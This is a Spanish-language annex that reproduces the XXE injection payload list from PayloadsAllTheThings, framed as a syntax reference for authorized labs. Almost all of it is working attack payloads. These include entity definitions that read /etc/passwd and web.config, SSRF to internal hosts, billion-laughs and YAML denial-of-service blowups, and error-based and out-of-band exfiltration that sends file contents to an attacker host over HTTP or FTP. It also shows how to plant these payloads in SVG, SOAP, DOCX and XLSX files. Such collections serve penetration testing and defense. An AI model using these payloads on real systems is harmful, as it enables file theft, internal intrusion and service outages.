# XML External Entity (XXE): anexo de ejemplos de PayloadsAllTheThings

> **Uso:** elegir el bloque que corresponde al motor, versión y punto de entrada. Las líneas de un bloque pueden ser alternativas. Sustituir hosts, rutas, identificadores y dominios por los del laboratorio o alcance autorizado. Los ejemplos originales son referencias de sintaxis, no pruebas verificadas contra el objetivo.

**Documento de origen:** [XXE Injection/README.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/XXE%20Injection/README.md), revisión fija 3ac27901c711. **Licencia:** [MIT de Swissky](../../LICENCIA_PATT.md).

[← Índice de anexos](Catalogo_PATT.md) · [← Guía principal](README.md)

## 1. XML External Entity / Detect The Vulnerability

```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY example "Doe"> ]>
 <userInfo>
  <firstName>John</firstName>
  <lastName>&example;</lastName>
 </userInfo>
```

### Variantes presentes en tablas o texto del apartado

```text
<!ENTITY entity_name "entity_value">
<!ENTITY entity_name SYSTEM "entity_value">
DOCTYPE
Content-Type: application/xml
&name;
%name;
```

## 2. Exploiting XXE to Retrieve Archivos / Classic XXE

```xml
<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>
```

```xml
<?xml version="1.0"?>
<!DOCTYPE data [
<!ELEMENT data (#ANY)>
<!ENTITY file SYSTEM "file:///etc/passwd">
]>
<data>&file;</data>
```

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
  <!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
```

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///c:/boot.ini" >]><foo>&xxe;</foo>
```

```ps1
<!ENTITY % xxe PUBLIC "Random Text" "URL">
<!ENTITY xxe PUBLIC "Any TEXT" "URL">
```

### Variantes presentes en tablas o texto del apartado

```text
/etc/passwd
```

## 3. Exploiting XXE to Retrieve Archivos / Classic XXE Base64 Encoded

```xml
<!DOCTYPE test [ <!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> %init; ]><foo/>
```

## 4. Exploiting XXE to Retrieve Archivos / PHP Wrapper Inside XXE

```xml
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
<contacts>
  <contact>
    <name>Jean &xxe; Dupont</name>
    <phone>00 11 22 33 44</phone>
    <address>42 rue du CTF</address>
    <zipcode>75000</zipcode>
    <city>Paris</city>
  </contact>
</contacts>
```

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY % xxe SYSTEM "php://filter/convert.base64-encode/resource=http://10.0.0.3" >
]>
<foo>&xxe;</foo>
```

## 5. Exploiting XXE to Retrieve Archivos / XInclude Attacks

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>
```

## 6. XML External Entity / Exploiting XXE to Perform SSRF Attacks

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "http://internal.service/secret_pass.txt" >
]>
<foo>&xxe;</foo>
```

## 7. Exploiting XXE to Perform a Denial of Service / Billion Laugh Attack

```xml
<!DOCTYPE data [
<!ENTITY a0 "dos" >
<!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
<!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
<!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
<!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
]>
<data>&a4;</data>
```

## 8. Exploiting XXE to Perform a Denial of Service / YAML Attack

```xml
a: &a ["lol","lol","lol","lol","lol","lol","lol","lol","lol"]
b: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a]
c: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b]
d: &d [*c,*c,*c,*c,*c,*c,*c,*c,*c]
e: &e [*d,*d,*d,*d,*d,*d,*d,*d,*d]
f: &f [*e,*e,*e,*e,*e,*e,*e,*e,*e]
g: &g [*f,*f,*f,*f,*f,*f,*f,*f,*f]
h: &h [*g,*g,*g,*g,*g,*g,*g,*g,*g]
i: &i [*h,*h,*h,*h,*h,*h,*h,*h,*h]
```

## 9. Exploiting XXE to Perform a Denial of Service / Parámetros Laugh Attack

```xml
<!DOCTYPE r [
  <!ENTITY % pe_1 "<!---->">
  <!ENTITY % pe_2 "&#37;pe_1;<!---->&#37;pe_1;">
  <!ENTITY % pe_3 "&#37;pe_2;<!---->&#37;pe_2;">
  <!ENTITY % pe_4 "&#37;pe_3;<!---->&#37;pe_3;">
  %pe_4;
]>
<r/>
```

## 10. Exploiting Basada en errores XXE / Basada en errores - Usando Local DTD Archivo

```xml
<!DOCTYPE root [
    <!ENTITY % local_dtd SYSTEM "file:///abcxyz/">
    %local_dtd;
]>
<root></root>
```

## 11. Basada en errores - Usando Local DTD Archivo / Linux Local DTD

```xml
/usr/share/xml/fontconfig/fonts.dtd
/usr/share/xml/scrollkeeper/dtds/scrollkeeper-omf.dtd
/usr/share/xml/svg/svg10.dtd
/usr/share/xml/svg/svg11.dtd
/usr/share/yelp/dtd/docbookx.dtd
```

```xml
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:///usr/share/xml/fontconfig/fonts.dtd">
    <!ENTITY % constant 'aaa)>
            <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
            <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///patt/&#x25;file;&#x27;>">
            &#x25;eval;
            &#x25;error;
            <!ELEMENT aa (bb'>
    %local_dtd;
]>
<message>Text</message>
```

### Variantes presentes en tablas o texto del apartado

```text
locate .dtd
/usr/share/xml/fontconfig/fonts.dtd
%constant
<!ENTITY % constant 'int|double|string|matrix|bool|charset|langset|const'>
```

## 12. Basada en errores - Usando Local DTD Archivo / Windows Local DTD

```xml
  <!DOCTYPE doc [
      <!ENTITY % local_dtd SYSTEM "file:///C:\Windows\System32\wbem\xml\cim20.dtd">
      <!ENTITY % SuperClass '>
          <!ENTITY &#x25; file SYSTEM "file://D:\webserv2\services\web.config">
          <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file://t/#&#x25;file;&#x27;>">
          &#x25;eval;
          &#x25;error;
        <!ENTITY test "test"'
      >
      %local_dtd;
    ]><xxx>anything</xxx>
```

```xml
  <!DOCTYPE doc [
      <!ENTITY % local_dtd SYSTEM "file:///C:\Windows\System32\wbem\xml\cim20.dtd">
      <!ENTITY % SuperClass '>
          <!ENTITY &#x25; file SYSTEM "https://erp.company.com">
          <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file://test/#&#x25;file;&#x27;>">
          &#x25;eval;
          &#x25;error;
        <!ENTITY test "test"'
      >
      %local_dtd;
    ]><xxx>anything</xxx>
```

## 13. Exploiting Basada en errores XXE / Basada en errores - Usando Remote DTD

```xml
<?xml version="1.0" ?>
<!DOCTYPE message [
    <!ENTITY % ext SYSTEM "http://[ATTACKER.DOMAIN.TLD]/ext.dtd">
    %ext;
]>
<message></message>
```

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

```xml
<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; leak SYSTEM '%data;:///'>">
%eval;
%leak;
```

### Variantes presentes en tablas o texto del apartado

```text
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
/etc/passwd
&#x25;
%
%eval;
%error;
```

## 14. Exploiting Ciega XXE to Exfiltrate Datos Fuera de banda / Básicos Ciega XXE

```xml
<?xml version="1.0" ?>
<!DOCTYPE root [
<!ENTITY % ext SYSTEM "http://[ATTACKER.DOMAIN.TLD]/x"> %ext;
]>
<r></r>
```

```xml
<!DOCTYPE root [<!ENTITY test SYSTEM 'http://[ATTACKER.DOMAIN.TLD]'>]>
<root>&test;</root>
```

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY % xxe SYSTEM "file:///etc/passwd" >
<!ENTITY callhome SYSTEM "http://[ATTACKER.DOMAIN.TLD]/?%xxe;">
]
>
<foo>&callhome;</foo>
```

### Variantes presentes en tablas o texto del apartado

```text
/etc/passwd
http://[ATTACKER.DOMAIN.TLD]
```

## 15. Exploiting Ciega XXE to Exfiltrate Datos Fuera de banda / Fuera de banda XXE

```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE data SYSTEM "http://[ATTACKER.DOMAIN.TLD]/parameterEntity_oob.dtd">
<data>&send;</data>

File stored on http://[ATTACKER.DOMAIN.TLD]/parameterEntity_oob.dtd
<!ENTITY % file SYSTEM "file:///sys/power/image_size">
<!ENTITY % all "<!ENTITY send SYSTEM 'http://[ATTACKER.DOMAIN.TLD]/?%file;'>">
%all;
```

## 16. Exploiting Ciega XXE to Exfiltrate Datos Fuera de banda / XXE OOB Con DTD and PHP Filter

```xml
<?xml version="1.0" ?>
<!DOCTYPE r [
<!ELEMENT r ANY >
<!ENTITY % sp SYSTEM "http://10.10.10.10/dtd.xml">
%sp;
%param1;
]>
<r>&exfil;</r>

File stored on http://10.10.10.10/dtd.xml
<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://10.10.10.10/dtd.xml?%data;'>">
```

## 17. Exploiting Ciega XXE to Exfiltrate Datos Fuera de banda / XXE OOB Con Apache Karaf

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://[ATTACKER.DOMAIN.TLD]"> %dtd;]
<features name="my-features" xmlns="http://karaf.apache.org/xmlns/features/v1.3.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
        xsi:schemaLocation="http://karaf.apache.org/xmlns/features/v1.3.0 http://karaf.apache.org/xmlns/features/v1.3.0">
    <feature name="deployer" version="2.0" install="auto">
    </feature>
</features>
```

## 18. WAF Bypasses / Evasión via Character Codificación

```bash
cat utf8exploit.xml | iconv -f UTF-8 -t UTF-16BE > utf16exploit.xml
```

### Variantes presentes en tablas o texto del apartado

```text
Content-Type: text/xml; charset=utf-8
<?xml version="1.0" encoding="UTF-8"?>
UTF-16
```

## 19. WAF Bypasses / XXE on JSON Endpoints

```json
{
  "errors":{
    "errorMessage":"org.xml.sax.SAXParseException: XML document structures must start and end within the same entity."
  }
}
```

### Variantes presentes en tablas o texto del apartado

```text
Content-Type
application/json
{"search":"name","value":"test"}
application/xml
<?xml version="1.0" encoding="UTF-8" ?><root><search>name</search><value>data</value></root>
<root>
```

## 20. XXE in Exotic Archivos / XXE Inside SVG

```xml
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200">
    <image xlink:href="expect://ls" width="200" height="200"></image>
</svg>
```

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
   <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [
<!ELEMENT svg ANY >
<!ENTITY % sp SYSTEM "http://10.10.10.10:8080/xxe.xml">
%sp;
%param1;
]>
<svg viewBox="0 0 200 200" version="1.2" xmlns="http://www.w3.org/2000/svg" style="fill:red">
      <text x="15" y="100" style="fill:black">XXE via SVG rasterization</text>
      <rect x="0" y="0" rx="10" ry="10" width="200" height="200" style="fill:pink;opacity:0.7"/>
      <flowRoot font-size="15">
         <flowRegion>
           <rect x="0" y="0" width="200" height="200" style="fill:red;opacity:0.3"/>
         </flowRegion>
         <flowDiv>
            <flowPara>&exfil;</flowPara>
         </flowDiv>
      </flowRoot>
</svg>
```

```xml
<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/etc/hostname">
<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'ftp://10.10.10.10:2121/%data;'>">
```

## 21. XXE in Exotic Archivos / XXE Inside SOAP

```xml
<soap:Body>
  <foo>
  <![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://10.10.10.10:22/"> %dtd;]><xxx/>]]>
  </foo>
</soap:Body>
```

## 22. XXE in Exotic Archivos / XXE Inside DOCX Archivo

```xml
DOCX/XLSX/PPTX
ODT/ODG/ODP/ODS
SVG
XML
PDF (experimental)
JPG (experimental)
GIF (experimental)
```

### Variantes presentes en tablas o texto del apartado

```text
zip -u xxe.docx [Content_Types].xml
```

## 23. XXE in Exotic Archivos / XXE Inside XLSX Archivo

```ps1
$ 7z l xxe.xlsx
[...]
   Date      Time    Attr         Size   Compressed  Name
------------------- ----- ------------ ------------  ------------------------
2021-10-17 15:19:00 .....          578          223  _rels/.rels
2021-10-17 15:19:00 .....          887          508  xl/workbook.xml
2021-10-17 15:19:00 .....         4451          643  xl/styles.xml
2021-10-17 15:19:00 .....         2042          899  xl/worksheets/sheet1.xml
2021-10-17 15:19:00 .....          549          210  xl/_rels/workbook.xml.rels
2021-10-17 15:19:00 .....          201          160  xl/sharedStrings.xml
2021-10-17 15:19:00 .....          731          352  docProps/core.xml
2021-10-17 15:19:00 .....          410          246  docProps/app.xml
2021-10-17 15:19:00 .....         1367          345  [Content_Types].xml
------------------- ----- ------------ ------------  ------------------------
2021-10-17 15:19:00              11216         3586  9 files
```

```ps1
cd XXE
zip -r -u ../xxe.xlsx *
```

```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE cdl [<!ELEMENT cdl ANY ><!ENTITY % asd SYSTEM "http://10.10.10.10:8000/xxe.dtd">%asd;%c;]>
<cdl>&rrr;</cdl>
<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">
```

```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE cdl [<!ELEMENT t ANY ><!ENTITY % asd SYSTEM "http://10.10.10.10:8000/xxe.dtd">%asd;%c;]>
<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="10" uniqueCount="10"><si><t>&rrr;</t></si><si><t>testA2</t></si><si><t>testA3</t></si><si><t>testA4</t></si><si><t>testA5</t></si><si><t>testB1</t></si><si><t>testB2</t></si><si><t>testB3</t></si><si><t>testB4</t></si><si><t>testB5</t></si></sst>
```

```xml
<!ENTITY % d SYSTEM "file:///etc/passwd">
<!ENTITY % c "<!ENTITY rrr SYSTEM 'ftp://10.10.10.10:2121/%d;'>">
```

```ps1
xxeserv -o files.log -p 2121 -w -wd public -wp 8000
```

### Variantes presentes en tablas o texto del apartado

```text
7z x -oXXE xxe.xlsx
zip -u
file XXE.xlsx
Microsoft Excel 2007+
7z a -tzip
xl/workbook.xml
xl/sharedStrings.xml
xxe.dtd
```

## 24. XXE in Exotic Archivos / XXE Inside DTD Archivo

```xml
<!-- Load the contents of a sensitive file into a variable -->
<!ENTITY % payload SYSTEM "file:///etc/passwd">
<!-- Use that variable to construct an HTTP get request with the file contents in the URL -->
<!ENTITY % param1 '<!ENTITY &#37; external SYSTEM "http://[ATTACKER.DOMAIN.TLD]/x=%payload;">'>
%param1;
%external;
```

### Variantes presentes en tablas o texto del apartado

```text
DOCTYPE
xml
```

---

[← Índice de anexos](Catalogo_PATT.md) · [← Guía principal](README.md) · [Licencia de origen](../../LICENCIA_PATT.md)
